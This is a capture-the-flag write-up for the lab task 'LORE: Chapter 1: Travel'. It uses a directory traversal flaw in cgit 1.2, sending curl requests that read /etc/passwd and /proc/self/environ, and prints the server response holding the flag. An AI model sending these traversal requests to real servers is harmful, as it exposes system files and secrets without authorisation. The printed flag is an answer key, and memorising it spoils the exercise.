LORE: Chapter 1: Travel
======================================

## Task

Hi, TCC-CSIRT analyst,

do you know the feeling when, after a demanding shift, you fall into lucid dreaming and even in your sleep, you encounter tricky problems? Help a colleague solve tasks in the complex and interconnected world of LORE, where it is challenging to distinguish reality from fantasy.

The entry point to LORE is at http://intro.lore.tcc.

## Solution

Open link from the entry point portal. App looks like cgit but there is just information about restricted access. Look in the source code, there is commented section with URL /cgit.cgi. Try it manually, it's working. There are two git repositories. In bottom is version of cgit: 1.2. This version has known vulnerability: directory traversal which allows to serve any file on filesystem. Let's try it with curl:

```
curl -v http://cgit.lore.tcc/cgit.cgi/foo/objects/?path=../../../etc/passwd
```

Depth of directory is needed to test, this was working. Disadvantage is that we can't list directory content. If we look in the sam-operator application, we can see that the flag is in environment variables. Let's assume that it's true for this task. So, let's try file /proc/1/environ. But it has empty content... We can look to /etc/hosts file where we can see comment about kubernetes environment. So it's probably kubernetes container. In kubernetes should work reading file /proc/self/environ. Let's try it:

```
 curl -v http://cgit.lore.tcc/cgit.cgi/foo/objects/?path=../../../proc/self/environ --output -
* Host cgit.lore.tcc:80 was resolved.
* IPv6: (none)
* IPv4: 10.99.24.82
*   Trying 10.99.24.82:80...
* Connected to cgit.lore.tcc (10.99.24.82) port 80
* using HTTP/1.x
> GET /cgit.cgi/foo/objects/?path=../../../proc/self/environ HTTP/1.1
> Host: cgit.lore.tcc
> User-Agent: curl/8.10.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Tue, 29 Oct 2024 17:47:07 GMT
< Content-Type: application/octet-stream; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Content-Disposition: inline; filename="objects/../../../proc/self/environ"
< Expires: Tue, 29 Oct 2024 17:52:07 GMT
< Last-Modified: Tue, 29 Oct 2024 17:47:07 GMT
< 
FLAG=FLAG{FiqE-rPQL-pUV4-daQt}HTTP_HOST=cgit.lore.tccHTTP_X_REQUEST_ID=6275dc7ef6e35e739efe26d88adc3528HTTP_X_REAL_IP=10.200.0.37HTTP_X_FORWARDED_FOR=10.200.0.37HTTP_X_FORWARDED_HOST=cgit.lore.tccHTTP_X_FORWARDED_PORT=80HTTP_X_FORWARDED_PROTO=httpHTTP_X_FORWARDED_SCHEME=httpHTTP_X_SCHEME=httpHTTP_USER_AGENT=curl/8.10.1HTTP_ACCEPT=*/*PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binSERVER_SIGNATURE=<address>Apache/2.4.61 (Debian) Server at cgit.lore.tcc Port 80</address>
SERVER_SOFTWARE=Apache/2.4.61 (Debian)SERVER_NAME=cgit.lore.tccSERVER_ADDR=192.168.73.80SERVER_PORT=80REMOTE_ADDR=192.168.73.122DOCUMENT_ROOT=/var/www/htmlREQUEST_SCHEME=httpCONTEXT_PREFIX=CONTEXT_DOCUMENT_ROOT=/var/www/htmlSERVER_ADMIN=[no address given]SCRIPT_FILENAME=/var/www/html/cgit.cgiREMOTE_PORT=38548GATEWAY_INTERFACE=CGI/1.1SERVER_PROTOCOL=HTTP/1.1REQUEST_METHOD=GETQUERY_STRING=path=../../../proc/self/environREQUEST_URI=/cgit.cgi/foo/objects/?path=../../../proc/self/environSCRIPT_NAME=/cg* Connection #0 to host cgit.lore.tcc left intact
it.cgiPATH_INFO=/foo/objects/PATH_TRANSLATED=/var/www/html/foo/objects/   
```

And we have our flag: FLAG=FLAG{FiqE-rPQL-pUV4-daQt}